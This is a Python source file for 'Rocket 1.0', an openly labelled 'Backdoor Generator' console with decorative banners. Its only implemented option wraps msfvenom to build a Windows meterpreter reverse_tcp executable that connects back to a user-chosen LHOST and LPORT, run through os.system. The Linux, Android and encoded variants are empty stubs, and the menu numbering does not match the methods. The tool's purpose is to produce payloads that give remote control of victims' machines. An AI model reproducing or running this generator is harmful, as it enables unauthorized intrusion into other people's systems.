import os
import random
import sys,traceback

def banner():
    banner1 = """
$$$$$$$\                      $$\                  $$\     
$$  __$$\                     $$ |                 $$ |    
$$ |  $$ | $$$$$$\   $$$$$$$\ $$ |  $$\  $$$$$$\ $$$$$$\   
$$$$$$$  |$$  __$$\ $$  _____|$$ | $$  |$$  __$$\\_$$  _|  
$$  __$$< $$ /  $$ |$$ /      $$$$$$  / $$$$$$$$ | $$ |    
$$ |  $$ |$$ |  $$ |$$ |      $$  _$$<  $$   ____| $$ |$$\ 
$$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ | \$$\ \$$$$$$$\  \$$$$  |
\__|  \__| \______/  \_______|\__|  \__| \_______|  \____/ 

        [ \033[1;92mRocket 1.0     :\033[1;m Backdoor Generator [beta]
+------=[ \033[1;92mCreator        :\033[1;m Muhammad Isa Wijaya Kusuma
+------=[ \033[1;92mCodename       :\033[1;m RConsole
+------=[ \033[1;92mVersion        :\033[1;m 1.0 beta
+------=[ \033[1;92mGithub         :\033[1;m @XFSsoftwareteam
    """
    banner2 = """
 _______  _______  _______  _        _______ _________
(  ____ )(  ___  )(  ____ \| \    /\(  ____ \\__   __/
| (    )|| (   ) || (    \/|  \  / /| (    \/   ) (   
| (____)|| |   | || |      |  (_/ / | (__       | |   
|     __)| |   | || |      |   _ (  |  __)      | |   
| (\ (   | |   | || |      |  ( \ \ | (         | |   
| ) \ \__| (___) || (____/\|  /  \ \| (____/\   | |   
|/   \__/(_______)(_______/|_/    \/(_______/   )_(   

        [ \033[1;92mRocket 1.0     :\033[1;m Backdoor Generator [beta]
+------=[ \033[1;92mCreator        :\033[1;m Muhammad Isa Wijaya Kusuma
+------=[ \033[1;92mCodename       :\033[1;m RConsole
+------=[ \033[1;92mVersion        :\033[1;m 1.0 beta
+------=[ \033[1;92mGithub         :\033[1;m @XFSsoftwareteam
    """
    banner3 = """
 ______    _______  _______  ___   _  _______  _______ 
|    _ |  |       ||       ||   | | ||       ||       |
|   | ||  |   _   ||       ||   |_| ||    ___||_     _|
|   |_||_ |  | |  ||       ||      _||   |___   |   |  
|    __  ||  |_|  ||      _||     |_ |    ___|  |   |  
|   |  | ||       ||     |_ |    _  ||   |___   |   |  
|___|  |_||_______||_______||___| |_||_______|  |___|

        [ \033[1;92mRocket 1.0     :\033[1;m Backdoor Generator [beta]
+------=[ \033[1;92mCreator        :\033[1;m Muhammad Isa Wijaya Kusuma
+------=[ \033[1;92mCodename       :\033[1;m RConsole
+------=[ \033[1;92mVersion        :\033[1;m 1.0 beta
+------=[ \033[1;92mGithub         :\033[1;m @XFSsoftwareteam
    """
    banner4 = """
,------.              ,--.            ,--.   
|  .--. ' ,---.  ,---.|  |,-. ,---. ,-'  '-. 
|  '--'.'| .-. || .--'|     /| .-. :'-.  .-' 
|  |\  \ ' '-' '\ `--.|  \  \\   --.  |  |   
`--' '--' `---'  `---'`--'`--'`----'  `--'

        [ \033[1;92mRocket 1.0     :\033[1;m Backdoor Generator [beta]
+------=[ \033[1;92mCreator        :\033[1;m Muhammad Isa Wijaya Kusuma
+------=[ \033[1;92mCodename       :\033[1;m RConsole
+------=[ \033[1;92mVersion        :\033[1;m 1.0 beta
+------=[ \033[1;92mGithub         :\033[1;m @XFSsoftwareteam
    """

    randBanner = [str(banner1),str(banner2),str(banner3),str(banner4)]
    print(random.choice(randBanner))

def backdoorsBanner():
    print("""
        [ \033[1;92mSelect backdoor to start\033[1;m
+------=[ \033[1;92m[1]\033[1;m PLAIN_windowsbackdoor
+------=[ \033[1;92m[2]\033[1;m SHIKATAGANAI_windowsbackdoor
+------=[ \033[1;92m[3]\033[1;m CMDPOWERSHELL_windowsbackoor
+------=[ \033[1;92m[4]\033[1;m EMBEDDED_windowsbackdoor
+------=[ \033[1;92m[5]\033[1;m PLAIN_linuxbackdoor
+------=[ \033[1;92m[6]\033[1;m SHIKATAGANAI_linuxbackdoor
+------=[ \033[1;92m[7]\033[1;m PLAIN_androidbackdoor
    """)
def commandsBanner():
    print("""
        [ \033[1;92mSelect command to take control\033[1;m
+------=[ \033[1;92m[clear         ]\033[1;m clear screen
+------=[ \033[1;92m[ifconfig      ]\033[1;m to show your IP address and specify wlan0
+------=[ \033[1;92m[restart       ]\033[1;m to restart rocket console
+------=[ \033[1;92m[exit          ]\033[1;m to exit from rocket console
+------=[ \033[1;92m[banner        ]\033[1;m to show banner
+------=[ \033[1;92m[msfconsole    ]\033[1;m to run msfconsole
+------=[ \033[1;92m[show backdoors]\033[1;m to show backdoors are available
+------=[ \033[1;92m[show Commands ]\033[1;m to show commands are available
    """)

try:
    class Settings:
        lhost = ""
        lport = ""
        filename = ""
        directory = ""
        def Set(self,lhost,lport,filename,directory):
            self.lhost = lhost
            self.lport = lport
            self.filename = filename
            self.directory = directory

    class backdoors:
        #Windows backdoors type
        def PLAIN_windowsbackdoor(self):
            backdoorSettings = Settings()
            PLAIN_BACKDOOR = "sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows "+"LHOST="+str(backdoorSettings.lhost)+" LPORT="+str(backdoorSettings.lport)+" -f exe -o "+str(backdoorSettings.directory)+str(backdoorSettings.filename)
            while True:
                PLAIN = str(input("rocket[PLAIN_windowsbackdoor] >> "))
                if PLAIN == "back":
                    rocket_console()
                elif PLAIN == "show settings":
                    print("LHOST : " + str(backdoorSettings.lhost))
                    print("LPORT : " + str(backdoorSettings.lport))
                    print("Filename : " + str(backdoorSettings.filename))
                    print("Directory : " + str(backdoorSettings.directory)) 
                elif PLAIN == "set lhost":
                     backdoorSettings.lhost = str(input("set LHOST : "))
                elif PLAIN == "set lport":
                     backdoorSettings.lport = str(input("set LPORT : "))
                elif PLAIN == "set filename":
                     backdoorSettings.filename = str(input("set Filename : "))
                elif PLAIN == "set directory":
                     backdoorSettings.directory = str(input("set Directory : "))
                elif PLAIN == "create":
                    backdoorGENERATE = os.system(PLAIN_BACKDOOR)
            pass
        def SHIKATAGANAI_windowsbackdoor(self):
            print()
        def CMDPOWERSHELL_windowsbackoor(self):
            print()
        def EMBEDDED_windowsbackdoor(self):
            print()

        #Linux backdoors type
        def PLAIN_linuxbackdoor(self):
            print()
        def SHIKATAGANAI_linuxbackdoor(self):
            print()
        
        #Android backdoors type
        def PLAIN_androidbackdoor(self):
            print()

    def rocket_console():
        backdoorList = backdoors()
        rocket_console = ""
        while True:
            rocket_console = str(input("\033[1;92mRocket\033[1;m >> "))
            #Windows backdoor Selection
            if rocket_console == "1":
                backdoorList.PLAIN_windowsbackdoor()
            elif rocket_console == "2":
                backdoorList.SHIKATAGANAI_windowsbackdoor()
            elif rocket_console == "3":
                backdoorList.CMDPOWERSHELL_windowsbackoor()
            #Linux backdoor Selection
            elif rocket_console == "4":
                backdoorList.PLAIN_linuxbackdoor()
            elif rocket_console == "5":
                backdoorList.SHIKATAGANAI_linuxbackdoor()
            #Android backdoor Selection
            elif rocket_console == "6":
                backdoorList.PLAIN_androidbackdoor()
            #Commands on rocket
            elif rocket_console == "banner":
                banner()
            elif rocket_console == "clear":
                clear = os.system("clear")
            elif rocket_console == "restart":
                StartRocket = os.system("python3 rocket.py")
                exit()
            elif rocket_console == "exit":
                exit()
            elif rocket_console == "ifconfig":
                ifconfig = os.system("ifconfig")
            elif rocket_console == "show backdoors":
                backdoorsBanner()
            elif rocket_console == "show commands":
                commandsBanner()
            elif rocket_console == "msfconsole":
                msfconsole = os.system("msfconsole")
            else:
                if rocket_console != "":
                    print
        pass
    
    def Main():
        banner()
        rocket_console()
    
    if __name__ == "__main__":
        Main()

except KeyboardInterrupt:
    print("Shutdown Requested .......")